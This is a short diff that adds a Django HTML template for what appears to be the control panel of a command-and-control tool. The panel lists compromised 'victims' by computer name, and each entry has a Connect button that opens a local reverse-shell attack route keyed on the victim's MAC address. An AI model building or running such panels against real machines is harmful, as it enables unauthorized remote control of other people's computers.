@@ -1,0 +1,20 @@
+{% extends 'base.html' %}
+
+{% block content %}
+    <h1>Victims</h1>
+    <ul>
+    {% for victim in object_list %}
+        <li>{{ victim.computer_name }}
+            <button value="{{ victim.mac_address }}" onclick="connect(this.value)">Connect</button>
+        </li>
+    {% empty %}
+        <li>No victims available.</li>
+    {% endfor %}
+    </ul>
+<script>
+    function connect(mac_address) {
+        window.location.assign('http://localhost:8000/reverse_shell/attack/' + mac_address + '/');
+    }
+</script>
+{% endblock %}
+
